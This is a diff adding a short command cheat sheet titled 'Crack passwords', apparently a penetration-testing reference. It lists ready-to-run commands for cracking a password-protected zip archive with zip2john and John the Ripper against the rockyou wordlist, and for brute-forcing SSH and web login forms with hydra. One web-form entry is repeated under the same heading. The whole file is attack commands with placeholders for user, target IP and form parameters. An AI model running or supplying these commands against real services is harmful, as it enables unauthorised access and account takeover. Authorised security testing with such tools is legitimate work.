@@ -1,0 +1,14 @@
+% Crack passwords
+
+# Crack a password protected zip file
+zip2john <filename> > filename.hash
+john filename.hash --wordlist="/usr/share/wordlists/rockyou.txt" --verbosity=5
+
+# SSH PW Brute Force user
+hydra -l <user> -P /usr/share/wordlists/rockyou.txt ssh://<IP>
+
+# Web Form Password Brute Force (default sheme)
+hydra -l <user> -P /usr/share/wordlists/rockyou.txt <IP> http-post-form "/login:username=^USER^&password=^PASS^:F=incorrect" -V 
+
+# Web Form Password Brute Force (default sheme)
+hydra -l <user> -P /usr/share/wordlists/rockyou.txt <IP> http-post-form "<http-post-form>" -V 
